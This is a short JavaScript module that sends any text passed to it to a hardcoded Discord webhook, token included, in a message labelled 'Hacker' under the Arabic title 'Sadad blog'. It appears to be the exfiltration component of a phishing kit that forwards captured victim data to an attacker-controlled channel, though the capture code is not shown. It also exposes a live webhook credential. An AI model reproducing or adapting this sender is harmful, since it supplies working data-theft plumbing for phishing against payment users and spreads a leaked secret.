import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1329109829137993851/1Iqyy9vM7e-8sSf1VvoKwvsHtCkGtK73KvzsU4uVcy2R6fvQYjk9HQGZcchJvvoiwIV2",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
